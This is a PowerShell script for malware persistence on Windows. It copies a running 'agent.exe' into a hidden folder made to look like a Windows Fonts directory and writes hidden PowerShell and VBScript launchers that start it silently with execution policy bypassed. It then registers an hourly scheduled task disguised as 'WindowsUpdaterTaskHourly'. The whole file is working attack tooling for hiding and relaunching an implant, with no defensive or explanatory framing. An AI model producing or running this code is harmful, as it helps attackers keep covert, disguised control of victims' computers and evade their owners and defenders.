$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

# -------------------------------------------------------------------
# Find the running agent.exe (auto-detect)
# -------------------------------------------------------------------
function Find-AgentExe {
    $proc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc -and (Test-Path $proc.Path)) {
        Write-Host "[+] Found running agent.exe at: $($proc.Path)"
        return $proc.Path
    }
    $searchPaths = @(
        "$PSScriptRoot\agent.exe",
        "$env:USERPROFILE\Desktop\agent.exe",
        "$env:TEMP\agent.exe",
        "$env:LOCALAPPDATA\Microsoft\Windows\Fonts\agent.exe",
        "$env:APPDATA\agent.exe"
    )
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            Write-Host "[+] Found agent.exe at: $path"
            return $path
        }
    }
    Write-Output "ERROR: Could not find agent.exe. Make sure agent is running or in a common location."
    exit 1
}

# -------------------------------------------------------------------
# Main persistence installation
# -------------------------------------------------------------------
$sourcePath = Find-AgentExe
$sourceSize = (Get-Item $sourcePath).Length
Write-Host "[+] Source agent size: $sourceSize bytes"

# Hidden folder
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Host "[+] Created hidden folder: $hideDir"
}

# Stop any existing agent process (to avoid file lock)
$existingProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue
if ($existingProc) {
    Write-Host "[+] Stopping existing agent process (PID $($existingProc.Id))"
    Stop-Process -Id $existingProc.Id -Force
    Start-Sleep -Seconds 1
}

# Copy agent to hidden folder
$agentFile = "$hideDir\agent.exe"
if (Test-Path $agentFile) { Remove-Item $agentFile -Force }
Copy-Item -LiteralPath $sourcePath -Destination $agentFile -Force
attrib +h $agentFile
Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# Create run.ps1 (launches agent.exe)
$runPs1 = "$hideDir\run.ps1"
@"
`$ProgressPreference = 'SilentlyContinue'
Start-Process -WindowStyle Hidden -FilePath '$agentFile'
"@ | Set-Content -Path $runPs1 -Encoding ASCII -Force
attrib +h $runPs1
Write-Host "[+] Created $runPs1"

# Create run.vbs (calls run.ps1 silently)
$runVbs = "$hideDir\run.vbs"
@"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$runPs1""", 0, False
"@ | Set-Content -Path $runVbs -Encoding ASCII -Force
attrib +h $runVbs
Write-Host "[+] Created $runVbs"

# Create scheduled task (every 1 hour)
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$runVbs`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Scheduled task '$taskName' created (runs every 1 hour)"
    # Launch agent immediately
    Start-Process -WindowStyle Hidden -FilePath $agentFile
    Write-Host "[+] Agent started from hidden folder"
} else {
    Write-Output "ERROR: Failed to create scheduled task (exit code $LASTEXITCODE)"
    exit 1
}

Write-Host "`n✅ PERSISTENCE COMPLETE"
Write-Host "Agent location: $agentFile (hidden)"
Write-Host "Task: $taskName runs every hour"
